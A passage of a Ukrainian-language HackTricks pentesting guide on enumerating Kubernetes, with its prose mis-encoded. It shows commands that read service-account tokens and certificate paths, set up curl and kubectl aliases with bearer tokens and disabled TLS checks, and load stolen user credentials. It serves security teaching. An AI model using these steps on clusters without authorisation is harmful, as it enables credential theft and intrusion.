# –ü–µ—Ä–µ–ª—ñ–∫ Kubernetes

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>

## –¢–æ–∫–µ–Ω–∏ Kubernetes

–Ø–∫—â–æ —É –≤–∞—Å —î –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –º–∞—à–∏–Ω–∏, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—è–∫–æ—ó –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏ Kubernetes. –¢–æ–∫–µ–Ω –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ —Ñ–∞–π–ª—ñ, –Ω–∞ —è–∫–∏–π –≤–∫–∞–∑—É—î **–∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ `KUBECONFIG`** –∞–±–æ **–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `~/.kube`**.

–£ —Ü—ñ–π –ø–∞–ø—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑ **—Ç–æ–∫–µ–Ω–∞–º–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ API**. –¢–∞–∫–æ–∂ —É —Ü—ñ–π –ø–∞–ø—Ü—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –ø–∞–ø–∫—É –∫–µ—à—É –∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é, —è–∫–∞ –±—É–ª–∞ –æ—Ç—Ä–∏–º–∞–Ω–∞ —Ä–∞–Ω—ñ—à–µ.

–Ø–∫—â–æ –≤–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–ª–∏ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Kubernetes, —î —ñ–Ω—à—ñ –º—ñ—Å—Ü—è, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ —Ç–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –ø–æ—Ç–æ—á–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ K8:

### –¢–æ–∫–µ–Ω–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±

–ü–µ—Ä—à –Ω—ñ–∂ –ø—Ä–æ–¥–æ–≤–∂—É–≤–∞—Ç–∏, —è–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ —Å–ª—É–∂–±–∞ –≤ Kubernetes, —è –± —Ä–µ–∫–æ–º–µ–Ω–¥—É–≤–∞–≤ –≤–∞–º **–ø–µ—Ä–µ–π—Ç–∏ –∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º —ñ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—É Kubernetes**.

–í–∑—è—Ç–æ –∑ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_¬´–ö–æ–ª–∏ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å, —è–∫—â–æ –≤–∏ –Ω–µ –≤–∫–∞–∑—É—î—Ç–µ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏, –≤—ñ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è_ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º _–≤ —Ç–æ–º—É –∂ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω¬ª._

**–û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏** - —Ü–µ –æ–±'—î–∫—Ç, –∫–µ—Ä–æ–≤–∞–Ω–∏–π Kubernetes —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ –ø—Ä–æ—Ü–µ—Å–∞–º, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å —É –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å—ñ.\
–£ –∫–æ–∂–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —î —Å–µ–∫—Ä–µ—Ç, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –Ω–∏–º, —ñ —Ü–µ–π —Å–µ–∫—Ä–µ—Ç –º—ñ—Å—Ç–∏—Ç—å —Ç–æ–∫–µ–Ω –Ω–æ—Å—ñ—è. –¶–µ JSON Web Token (JWT), –º–µ—Ç–æ–¥ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –ø—Ä–µ—Ç–µ–Ω–∑—ñ–π –±–µ–∑–ø–µ—á–Ω–æ –º—ñ–∂ –¥–≤–æ–º–∞ —Å—Ç–æ—Ä–æ–Ω–∞–º–∏.

–ó–∞–∑–≤–∏—á–∞–π **–æ–¥–∏–Ω** –∑ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

–º—ñ—Å—Ç—è—Ç—å —Ñ–∞–π–ª–∏:

* **ca.crt**: –¶–µ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç ca –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑–≤'—è–∑–∫—ñ–≤ Kubernetes
* **namespace**: –í–∫–∞–∑—É—î –ø–æ—Ç–æ—á–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω
* **token**: –ú—ñ—Å—Ç–∏—Ç—å **—Å–ª—É–∂–±–æ–≤–∏–π —Ç–æ–∫–µ–Ω** –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å—É.

–¢–µ–ø–µ—Ä, –∫–æ–ª–∏ —É –≤–∞—Å —î —Ç–æ–∫–µ–Ω, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–µ—Ä–≤–µ—Ä API –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **`KUBECONFIG`**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏–∫–æ–Ω–∞–π—Ç–µ `(env | set) | grep -i "kuber|kube`**`"`**

–¢–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –ø—ñ–¥–ø–∏—Å—É—î—Ç—å—Å—è –∫–ª—é—á–µ–º, —è–∫–∏–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —É —Ñ–∞–π–ª—ñ **sa.key** —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **sa.pub**.

–ú—ñ—Å—Ü–µ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞ **Kubernetes**:

* /etc/kubernetes/pki

–ú—ñ—Å—Ü–µ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞ **Minikube**:

* /var/lib/localkube/certs

### –ì–∞—Ä—è—á—ñ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å–∏

_**–ì–∞—Ä—è—á—ñ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å–∏**_ - —Ü–µ –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏. –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ - —Ü–µ —Ç–æ–∫–µ–Ω, —è–∫–∏–π –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å, —Ç–∞–∫–∏—Ö —è–∫ –ø–µ—Ä–µ–ª—ñ–∫ —Å–µ–∫—Ä–µ—Ç—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—ñ–¥–ø—Ä–æ—Ü–µ—Å—ñ–≤ —Ç–æ—â–æ.

## RBAC

–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ **RBAC**, **–ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π —Ä–æ–∑–¥—ñ–ª**.

## –®–ø–∞—Ä–≥–∞–ª–∫–∞ –∑ –ø–µ—Ä–µ–ª—ñ–∫—É

–î–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ K8s –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π:

* **–î—ñ–π—Å–Ω–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–∏–π —Ç–æ–∫–µ–Ω**. –£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ –º–∏ –ø–æ–±–∞—á–∏–ª–∏, –¥–µ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏.
* **–ê–¥—Ä–µ—Å–∞ (**_**https://host:port**_**) —Å–µ—Ä–≤–µ—Ä–∞ API Kubernetes**. –ó–∞–∑–≤–∏—á–∞–π —Ü–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —É –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —Ç–∞/–∞–±–æ —É —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó kube.
* **–ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ**: **ca.crt –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞ API**. –¶–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —Ç–∏—Ö –∂–µ –º—ñ—Å—Ü—è—Ö, –¥–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —Å–µ—Ä–≤–µ—Ä–∞ API, –∞–ª–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `--insecure-skip-tls-verify` –∑ `kubectl` –∞–±–æ `-k` –∑ `curl`, –≤–∞–º —Ü—å–æ–≥–æ –Ω–µ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è.

–ó —Ü–∏–º–∏ –¥–∞–Ω–∏–º–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ Kubernetes**. –Ø–∫—â–æ **API** –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ **–¥–æ—Å—Ç—É–ø–Ω–µ** —á–µ—Ä–µ–∑ **–Ü–Ω—Ç–µ—Ä–Ω–µ—Ç**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Ç–∞ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –∑ –≤–∞—à–æ–≥–æ —Ö–æ—Å—Ç–∞.

–û–¥–Ω–∞–∫ –∑–∞–∑–≤–∏—á–∞–π **—Å–µ—Ä–≤–µ—Ä API –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ**, —Ç–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ç—É–Ω–µ–ª—å** —á–µ—Ä–µ–∑ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—É –º–∞—à–∏–Ω—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø –∑ –≤–∞—à–æ—ó –º–∞—à–∏–Ω–∏, –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`curl/wget/anything`** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∏—Ä–æ–≥–æ HTTP-–∑–∞–ø–∏—Ç—ñ–≤ –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ API.

### –í—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—ñ –º—ñ–∂ –¥—ñ—î—Å–ª–æ–≤–∞–º–∏ `list` —Ç–∞ `get`

–ó –¥–æ–∑–≤–æ–ª–∞–º–∏ **`get`** –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –∞–∫—Ç–∏–≤–∏ (_–æ–ø—Ü—ñ—è `describe` –≤ `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ–∑–≤—ñ–ª **`list`**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏ API –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É —Ç–∏–ø—É –∞–∫—Ç–∏–≤—É (_–æ–ø—Ü—ñ—è `_`get`_ —É `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ–∑–≤—ñ–ª **`watch`**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏ API –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∞–∫—Ç–∏–≤—ñ–≤:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
–í–æ–Ω–∏ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å –ø–æ—Ç—ñ–∫–æ–≤–µ –∑'—î–¥–Ω–∞–Ω–Ω—è, —è–∫–µ –ø–æ–≤–µ—Ä—Ç–∞—î –≤–∞–º –ø–æ–≤–Ω–∏–π –º–∞–Ω—ñ—Ñ–µ—Å—Ç –†–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –≤—ñ–Ω –∑–º—ñ–Ω—é—î—Ç—å—Å—è (–∞–±–æ –∫–æ–ª–∏ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–æ–≤–∏–π).

{% hint style="danger" %}
–ù–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ `kubectl` –ø–æ–∫–∞–∑—É—é—Ç—å –ª–∏—à–µ, —è–∫ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –æ–±'—î–∫—Ç–∏. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–∞–Ω–∏—Ö, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `describe` –∑–∞–º—ñ—Å—Ç—å `get`
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è curl

–ó—Å–µ—Ä–µ–¥–∏–Ω–∏ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **–ø–æ–¥** –º–æ–∂–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø** –¥–æ **—Å–µ—Ä–≤–µ—Ä–∞ kube-api** –∑–∞ –¥–æ–º–µ–Ω–Ω–æ—é –Ω–∞–∑–≤–æ—é **`kubernetes.default.svc`**, —ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –º–µ—Ä–µ–∂—É kube –≤ **`/etc/resolv.config`**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç—É—Ç –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –∞–¥—Ä–µ—Å—É —Å–µ—Ä–≤–µ—Ä–∞ DNS Kubernetes (".1" —Ç–æ–≥–æ –∂ –¥—ñ–∞–ø–∞–∑–æ–Ω—É - —Ü–µ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ kube-api).
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è kubectl

–ú–∞—é—á–∏ —Ç–æ–∫–µ–Ω —Ç–∞ –∞–¥—Ä–µ—Å—É —Å–µ—Ä–≤–µ—Ä–∞ API, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ kubectl –∞–±–æ curl –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –Ω—å–æ–≥–æ, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ —Ç—É—Ç:

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, APISERVER —Å–ø—ñ–ª–∫—É—î—Ç—å—Å—è –∑–∞ —Å—Ö–µ–º–æ—é `https://`.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> —è–∫—â–æ –≤ URL –Ω–µ–º–∞—î `https://`, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É, –ø–æ–¥—ñ–±–Ω—É –¥–æ –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º–æ–≥–æ –∑–∞–ø–∏—Ç—É.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π —à–ø–∞—Ä–≥–∞–ª–∫—É kubectl —Ç—É—Ç**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). –ú–µ—Ç–æ—é –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —Ä–æ–∑–¥—ñ–ª—ñ–≤ —î –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è —É –≤–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–º—É –≤–∏–≥–ª—è–¥—ñ —Ä—ñ–∑–Ω–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É —Ç–∞ —Ä–æ–∑—É–º—ñ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ K8s, –¥–æ —è–∫–æ–≥–æ –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç—É–ø.

–©–æ–± –∑–Ω–∞–π—Ç–∏ HTTP-–∑–∞–ø–∏—Ç, —è–∫–∏–π –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î `kubectl`, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `-v=8`

#### MitM kubectl - –ü—Ä–æ–∫—Å—ñ—é–≤–∞–Ω–Ω—è kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### –ü–æ—Ç–æ—á–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞–ª–æ—Å—è –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–µ—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —ó—Ö –ª–æ–∫–∞–ª—å–Ω–æ**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤

–ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –≤–∏ –±—É–¥–µ—Ç–µ –∑–Ω–∞—Ç–∏ –≤—Å—ñ —Å–ª—É–∂–±–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
